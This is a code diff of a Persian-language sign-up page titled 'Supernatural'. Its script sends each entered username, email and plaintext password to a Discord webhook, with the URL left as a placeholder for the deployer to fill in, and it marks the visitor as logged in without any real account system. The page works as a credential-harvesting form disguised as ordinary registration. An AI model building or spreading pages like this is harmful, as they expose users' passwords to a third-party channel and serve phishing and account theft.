@@ -3,113 +3,61 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ثبت نام</title>
+  <title>ثبت‌نام - Supernatural</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0e0e0e;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .form-container {
-      background: #1a1a1a;
-      padding: 2rem;
-      border-radius: 12px;
-      width: 320px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.5);
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 1.5rem;
-      color: #8a2be2;
-    }
-    .form-group {
-      margin-bottom: 1rem;
-    }
-    label {
-      display: block;
-      margin-bottom: 0.5rem;
-    }
-    input {
-      width: 100%;
-      padding: 0.7rem;
-      border: none;
-      border-radius: 8px;
-      background: #2a2a2a;
-      color: #fff;
-    }
-    .btn {
-      width: 100%;
-      padding: 0.8rem;
-      background: #8a2be2;
-      border: none;
-      border-radius: 8px;
-      color: #fff;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .btn:hover {
-      background: #6a1db7;
-    }
-    .link {
-      display: block;
-      text-align: center;
-      margin-top: 1rem;
-      color: #aaa;
-      text-decoration: none;
-    }
-    .link:hover {
-      color: #fff;
-    }
+    body { font-family: 'Rubik', sans-serif; background: #0e0e0e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .form-box { background: #1a1a1a; padding: 2rem; border-radius: 12px; width: 300px; text-align: center; }
+    input { width: 100%; padding: 0.8rem; margin-bottom: 1rem; border: none; border-radius: 8px; background: #2a2a2a; color: #fff; }
+    button { width: 100%; padding: 1rem; border: none; border-radius: 8px; background: #8a2be2; color: #fff; cursor: pointer; }
+    button:hover { background: #6a1db7; }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2>ثبت نام</h2>
+  <div class="form-box">
+    <h2>ثبت‌نام</h2>
     <form id="registerForm">
-      <div class="form-group">
-        <label for="username">نام کاربری</label>
-        <input type="text" id="username" required>
-      </div>
-      <div class="form-group">
-        <label for="email">ایمیل</label>
-        <input type="email" id="email" required>
-      </div>
-      <div class="form-group">
-        <label for="password">رمز عبور</label>
-        <input type="password" id="password" required>
-      </div>
-      <button type="submit" class="btn">ثبت نام</button>
+      <input type="text" id="username" placeholder="نام کاربری" required>
+      <input type="email" id="email" placeholder="ایمیل" required>
+      <input type="password" id="password" placeholder="رمز عبور" required>
+      <button type="submit">ثبت‌نام</button>
     </form>
-    <a href="login.html" class="link">حساب دارید؟ وارد شوید</a>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/XXXX/XXXX"; // وبهوک دیسکوردت
+    const webhookURL = "🔗 اینجا لینک وبهوک دیسکورد بذار";
 
-    document.getElementById("registerForm").addEventListener("submit", async (e) => {
+    document.getElementById("registerForm").addEventListener("submit", function(e) {
       e.preventDefault();
-
       const username = document.getElementById("username").value;
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
       const payload = {
-        content: `📥 **ثبت‌نام جدید**\n👤 یوزرنیم: ${username}\n📧 ایمیل: ${email}\n🔑 پسورد: ${password}`
+        embeds: [{
+          title: "📝 ثبت‌نام کاربر جدید",
+          fields: [
+            { name: "👤 نام کاربری", value: username },
+            { name: "📧 ایمیل", value: email },
+            { name: "🔒 رمز عبور", value: password }
+          ],
+          color: 15844367,
+          timestamp: new Date()
+        }]
       };
 
-      await fetch(webhookURL, {
+      fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
+      }).then(res => {
+        if (res.ok) {
+          localStorage.setItem("loggedIn", "true");
+          alert("✅ ثبت‌نام موفقیت‌آمیز بود!");
+          window.location.href = "index.html";
+        } else {
+          alert("⚠️ خطا در ثبت‌نام!");
+        }
       });
-
-      alert("ثبت نام انجام شد ✅");
     });
   </script>
 </body>
